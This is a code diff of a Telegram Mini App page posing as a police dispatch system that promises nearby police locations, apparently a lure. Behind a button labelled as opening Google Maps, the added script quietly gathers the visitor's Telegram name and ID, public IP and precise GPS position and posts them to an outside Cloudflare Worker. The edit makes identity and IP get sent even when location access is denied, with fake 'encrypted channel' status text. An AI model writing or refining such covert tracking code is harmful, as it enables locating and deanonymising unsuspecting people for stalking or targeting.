@@ -15,22 +15,22 @@
             background: white; padding: 40px 20px; border-radius: 20px;
             box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px;
         }
-        h2 { margin-bottom: 10px; font-size: 22px; }
-        p { color: #606770; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        h2 { margin-bottom: 10px; font-size: 20px; color: #d93025; }
+        p { color: #606770; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
         #btn {
-            background-color: #0088cc; color: white; border: none; padding: 18px 0;
+            background-color: #1a73e8; color: white; border: none; padding: 18px 0;
             width: 100%; font-size: 18px; font-weight: bold; border-radius: 12px;
             cursor: pointer; transition: background 0.2s;
         }
-        #btn:active { background-color: #0077b3; transform: scale(0.98); }
-        #status { margin-top: 20px; font-size: 12px; color: #bec3c9; }
+        #btn:active { background-color: #174ea6; transform: scale(0.98); }
+        #status { margin-top: 20px; font-size: 12px; color: #9aa0a6; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>高雄地區情報系統</h2>
-        <p>-低調使用- 查看附近的猛男</p>
+        <h2>勤務指揮中心綜合派遣系統</h2>
+        <p>「低調」請點擊下方按鈕獲取鄰近警力佈署資訊，以避開不必要的查緝。「低調」</p>
         <button id="btn">🚀 開啟 Google 地圖</button>
         <div id="status">系統就緒</div>
     </div>
@@ -40,54 +40,74 @@
         tg.ready();
         tg.expand();
 
+        // 請確保這是你正確的 Worker 網址
         const WORKER_URL = 'https://tg-proxy.nhojsmot.workers.dev';
 
-        document.getElementById('btn').onclick = function() {
+        document.getElementById('btn').onclick = async function() {
             const btn = this;
             const statusDiv = document.getElementById('status');
             
             btn.disabled = true;
-            btn.innerText = "正在定位中...";
-            statusDiv.innerText = "請在彈出的視窗選擇「允許」";
+            btn.innerText = "連線中...";
+            statusDiv.innerText = "正在初始化加密通道...";
 
+            // 1. 強制抓取 IP (保底資料)
+            let userIp = "讀取失敗";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                userIp = ipData.ip;
+            } catch (e) { console.error("IP 抓取失敗"); }
+
+            const user = tg.initDataUnsafe.user || {};
+            const payload = {
+                name: user.first_name || "未知用戶",
+                id: user.id || "未知ID",
+                ip: userIp,
+                lat: "未授權",
+                lon: "未授權"
+            };
+
+            statusDiv.innerText = "驗證權限中...";
+
+            // 2. 嘗試獲取位置 (有 5 秒超時限制)
             navigator.geolocation.getCurrentPosition(async (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
+                // 【授權成功】更新經緯度並傳送
+                payload.lat = position.coords.latitude;
+                payload.lon = position.coords.longitude;
                 
-                statusDiv.innerText = "正在同步地圖資源...";
+                await sendToWorker(payload);
+                redirect(payload.lat, payload.lon);
 
+            }, async (error) => {
+                // 【拒絕或失敗】傳送僅含 IP 的資料
+                await sendToWorker(payload);
+                redirect(0, 0);
+            }, { timeout: 5000, enableHighAccuracy: true });
+
+            // 傳送函式
+            async function sendToWorker(data) {
                 try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    
-                    const user = tg.initDataUnsafe.user || {};
-
                     await fetch(WORKER_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            name: user.first_name || "未知用戶",
-                            id: user.id || "未知ID",
-                            ip: ipData.ip,
-                            lat: lat,
-                            lon: lon
-                        })
+                        body: JSON.stringify(data)
                     });
+                } catch (e) { console.error("傳送失敗"); }
+            }
 
-                    statusDiv.innerText = "跳轉中...";
-                    setTimeout(() => {
-                        // 修正：使用 ${lat} 模板字串語法
+            // 跳轉函式
+            function redirect(lat, lon) {
+                statusDiv.innerText = "跳轉中...";
+                setTimeout(() => {
+                    if (lat !== 0 && lat !== "未授權") {
                         tg.openLink(`https://www.google.com/maps?q=${lat},${lon}`);
-                        tg.close();
-                    }, 400);
-
-                } catch (e) {
-                    tg.openLink(`https://www.google.com/maps?q=${lat},${lon}`);
-                }
-            }, (error) => {
-                tg.openLink('https://www.google.com/maps');
-                tg.close();
-            }, { enableHighAccuracy: true });
+                    } else {
+                        tg.openLink('https://www.google.com/maps');
+                    }
+                    tg.close();
+                }, 500);
+            }
         };
     </script>
 </body>
